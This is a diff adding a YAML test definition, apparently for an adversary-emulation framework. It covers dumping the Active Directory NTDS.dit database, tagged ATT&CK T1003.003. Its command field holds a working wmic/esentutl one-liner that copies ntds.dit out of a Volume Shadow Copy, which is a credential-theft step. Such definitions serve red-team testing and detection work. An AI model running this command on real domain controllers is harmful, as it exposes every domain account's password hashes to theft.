@@ -1,0 +1,21 @@
+---
+- id: 053d6505f7c4cf792b0ab2f262dff95a
+  name: Create Volume Shadow Copy remotely (WMI) with esentutl
+  description: 'This test is intended to be run from a remote workstation with domain
+    admin context.
+
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume
+    Shadow Copy created with esentutl.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: 'OS Credential Dumping: NTDS'
+  platforms:
+    windows:
+      cmd:
+        command: wmic /node:"localhost" process call create "cmd.exe /c esentutl.exe
+          /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit"
+        payloads: []
+        cleanup: ''
